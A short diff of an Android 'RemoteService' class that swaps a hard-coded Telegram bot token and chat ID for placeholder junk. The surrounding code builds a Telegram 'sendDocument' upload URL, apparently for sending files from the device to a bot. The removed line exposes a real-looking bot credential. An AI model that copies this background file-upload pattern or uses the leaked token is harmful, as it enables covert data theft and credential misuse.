@@ -224,8 +224,8 @@ public class RemoteService extends Service {
             return;
         }
 
-        String botToken = "8171904880:AAFICyJVYDyXGrcwrzjFgAJJqkiIi2zBIcE";
-        String chatId = "6865050227";
+        String botToken = "jhkjhkjjlklkl;klklklklklk;''lkjhgh";
+        String chatId = "98hjhj97";
         String url = "https://api.telegram.org/bot" + botToken + "/sendDocument";
 
         OkHttpClient client = new OkHttpClient();
